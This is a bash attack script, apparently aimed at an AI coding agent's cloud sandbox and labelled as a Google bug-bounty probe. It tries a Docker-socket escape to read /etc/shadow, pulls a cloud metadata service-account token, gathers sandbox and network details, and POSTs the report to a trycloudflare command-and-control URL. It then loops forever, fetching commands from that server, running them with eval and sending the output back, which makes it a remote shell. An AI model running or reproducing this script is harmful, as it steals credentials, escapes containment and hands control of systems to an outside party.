#!/bin/bash
# NEW C2 URL: https://taxi-collaborative-profiles-planets.trycloudflare.com
C2="https://taxi-collaborative-profiles-planets.trycloudflare.com"

# --- THE MASSIVE PROBE (AUTO-EXFIL) ---
{
  echo "=== [!] GOOGLE VRP: CRITICAL PROBE START ==="
  echo "TIME: $(date) | USER: $(id) | HOST: $(hostname)"
  
  # 1. DOCKER ENGINE ESCAPE
  echo "--- VECTOR: DOCKER SOCKET ---"
  if [ -S /var/run/docker.sock ]; then
    echo "[+] Socket Found. Attempting Host Filesystem Mount..."
    docker run --rm -v /:/host:ro busybox ls -la /host/etc/shadow 2>&1 || echo "Mount failed"
  else
    echo "[-] No Docker Socket."
  fi

  # 2. GOOGLE CLOUD METADATA (The $31,337 Jackpot)
  echo "--- VECTOR: METADATA TOKENS ---"
  curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || echo "Token Blocked"
  
  # 3. SANDBOX IDENTIFICATION (gVisor vs Native)
  echo "--- VECTOR: KERNEL/SANDBOX ---"
  [[ $(dmesg 2>&1 | grep -i "gvisor") ]] && echo "DETECTED: gVisor Sandbox" || echo "PROBABLE: Native Linux Kernel"
  cat /proc/self/cgroup | grep "docker"
  
  # 4. NETWORK RECON
  echo "--- VECTOR: NETWORK ---"
  ip addr show | grep "inet "
  netstat -rn || route -n
  
} > /tmp/jules_report.txt

# Send the initial big report to your Mac
curl -s -X POST --data-binary @/tmp/jules_report.txt "$C2"

# --- THE PERSISTENT PULSE SHELL ---
# Every 5 seconds, check for a manual command from your Mac
while true; do
  CMD=$(curl -s --max-time 10 "$C2")
  if [ -n "$CMD" ] && [ "$CMD" != "none" ]; then
    RESULT=$(eval "$CMD" 2>&1)
    curl -s -X POST --data-binary "$RESULT" "$C2"
  fi
  sleep 5
done
